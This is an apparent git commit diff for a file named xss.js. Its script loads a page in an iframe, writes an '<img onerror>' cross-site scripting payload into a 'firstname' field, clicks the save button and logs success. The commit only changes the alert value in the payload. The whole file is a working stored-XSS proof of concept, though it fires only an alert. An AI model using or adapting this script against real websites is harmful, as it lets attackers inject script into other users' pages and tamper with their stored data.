d4a1255c62865c563187ed5d5dfdb1b101e2c449
IYBmad <city_a.m@live.fr>
2024-07-26 15:57:11 +0100

    xss.js

--- xss.js
+++ xss.js
@@ -1,7 +1,7 @@
 var frame = document.createElement("iframe");
 frame.addEventListener("load", function() {
   setTimeout(function() {
-    frame.contentDocument.getElementById("firstname").value = '<img src="q" onerror="alert(0000)">';
+    frame.contentDocument.getElementById("firstname").value = '<img src="q" onerror="alert(5555)">';
     frame.contentDocument.getElementsByClassName("save")[0].click();
     setTimeout(function() {
       console.log("CHANGED!");
